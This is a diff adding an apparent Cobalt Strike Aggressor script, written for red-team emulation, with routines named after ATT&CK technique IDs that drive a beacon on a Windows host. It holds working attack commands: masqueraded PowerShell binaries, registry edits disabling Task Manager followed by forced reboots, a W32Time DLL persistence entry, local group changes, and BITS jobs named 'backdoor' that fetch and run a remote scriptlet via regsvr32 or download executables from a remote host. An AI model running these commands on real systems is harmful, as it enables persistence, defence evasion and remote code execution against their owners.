@@ -1,0 +1,129 @@
+sub T1036_005_002{
+	UploadFile($1,"powershell.exe");
+	$shell = "C:\\RedTeam\\powershell.exe calc";
+	bshell($1,$shell);
+}
+
+sub T1036_005_003{
+	$dir = "C:\\Windows\\System32\\";
+	bmkdir($1, $dir);
+	bcd($1, $dir);
+	bupload($1, script_resource("resource\\powershell2.exe"));
+	$shell = "C:\\Windows\\System32\\powershell2.exe calc";
+	bshell($1,$shell);
+}
+
+sub T1562_001{
+	$bid = $1[0];
+	if (-isadmin $bid){
+		$shell = "remove-ItemProperty -Path HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name DisableTaskMgr";
+		bpowershell($1,$shell);
+		$shell = "new-ItemProperty -Path HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name DisableTaskMgr -Value 1";
+		bpowershell($1,$shell);
+		$shell = "remove-ItemProperty -Path HKCU:\\Software\\Microsoft\Windows\\CurrentVersion\\Policies\\System -Name DisableTaskMgr";
+		bpowershell($1,$shell);
+		$shell = "new-ItemProperty -Path HKCU:\\Software\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name DisableTaskMgr -Value 1";
+		bpowershell($1,$shell);
+		$shell = "remove-ItemProperty -Path HKCU:\\Software\Microsoft\\Windows\\CurrentVersion\\GroupPolicyObjects\\LocalUser\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name DisableTaskMgr";
+		bpowershell($1,$shell);
+		$shell = "new-ItemProperty -Path HKCU:\\Software\Microsoft\\Windows\\CurrentVersion\\GroupPolicyObjects\\LocalUser\\Software\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name DisableTaskMgr -Value 1";
+		bpowershell($1,$shell);
+		$shell = "remove-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon -Name DisableTaskMgr";
+		bpowershell($1,$shell);
+		$shell = "new-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon -Name DisableTaskMgr -Value 1";
+		bpowershell($1,$shell);
+		$shell = "shutdown /r /f";
+		bshell($1,$shell);
+	}
+	else{
+		btask($1,"\c4*******请先提权*******");
+	}	
+}
+
+sub T1562_001_recover{
+	$bid = $1[0];
+	if (-isadmin $bid){
+		$shell = "remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr";
+		bpowershell($1,$shell);
+		$shell = "remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr";
+		bpowershell($1,$shell);
+		$shell = "remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\GroupPolicyObjects\LocalUser\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr";
+		bpowershell($1,$shell);
+		$shell = "remove-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon -Name DisableTaskMgr";
+		bpowershell($1,$shell);
+		$shell = "shutdown /r /f";
+		bshell($1,$shell);
+	}
+	else{
+		btask($1,"\c4*******请先提权*******");
+	}	
+}
+
+sub T1078_001{
+	UploadFile($1,cmd_back.exe);
+	$bid = $1[0];
+	if (-isadmin $bid){
+		$shell = "C:\\RedTeam\\cmd_back.exe Net Localgroup Tests /add";
+		bshell($1,$shell);
+	}
+	else{
+		btask($1,"\c4*******请先提权*******");
+	}
+}
+
+sub T1209_001{
+	if (-isadmin $bid){
+		$shell = "Reg Add HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\W32Time\\TimeProviders\\NtpClient /v dllname /t REG_SZ /f /D \"c:\\test.dll\"";
+		bshell($1,$shell);
+		$shell = "Reg Add HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\W32Time\\TimeProviders\\NtpServer  /v dllname /t REG_SZ /f /D \"c:\\test.dll\"";
+		bshell($1,$shell);
+	}
+	else{
+		btask($1,"\c4*******请先提权*******");
+	}
+}
+
+sub T1209_001_recover{
+	if (-isadmin $bid){
+		$shell = "Reg delete HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\W32Time\\TimeProviders\\NtpClient /v dllname  /f ";
+		bshell($1,$shell);
+		$shell = "Reg delete HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\W32Time\\TimeProviders\\NtpServer  /v dllname  /f ";
+		bshell($1,$shell);
+	}
+	else{
+		btask($1,"\c4*******请先提权*******");
+	}
+}
+
+sub T1197_001_001{
+	$shell = "bitsadmin /create addfile";
+	bshell($1,$shell);
+	$shell = "bitsadmin /addfile addfile https://live.sysinternals.com/autoruns.exe c:\\data\\playfolder\\autoruns.exe";
+	bshell($1,$shell);
+	$shell = "bitsadmin /RESUME addfile";
+	bshell($1,$shell);
+	$shell = "bitsadmin /complete addfile";
+	bshell($1,$shell);
+}
+
+sub T1197_001_002{
+	$shell = "bitsadmin /create backdoor";
+	bshell($1,$shell);
+	$shell = "bitsadmin /addfile backdoor %comspec%  %temp%\\cmd.exe";
+	bshell($1,$shell);
+	$shell = "bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe \"/u /s /i:http://192.168.1.10:8080/calc.sct scrobj.dll\"";
+	bshell($1,$shell);
+	$shell = "bitsadmin /Resume backdoor";
+	bshell($1,$shell);
+}
+
+sub T1197_001_003{
+	$shell = "bitsadmin /create transfer";
+	bshell($1,$shell);
+	$shell = "bitsadmin /transfer transfer /download /priority normal http://192.168.1.10:8080/test.exe c:\\test\\transfer.exe";
+	bshell($1,$shell);
+	$shell = "bitsadmin /RESUME transfer";
+	bshell($1,$shell);
+	$shell = "bitsadmin /Reset transfers";
+	bshell($1,$shell);
+}
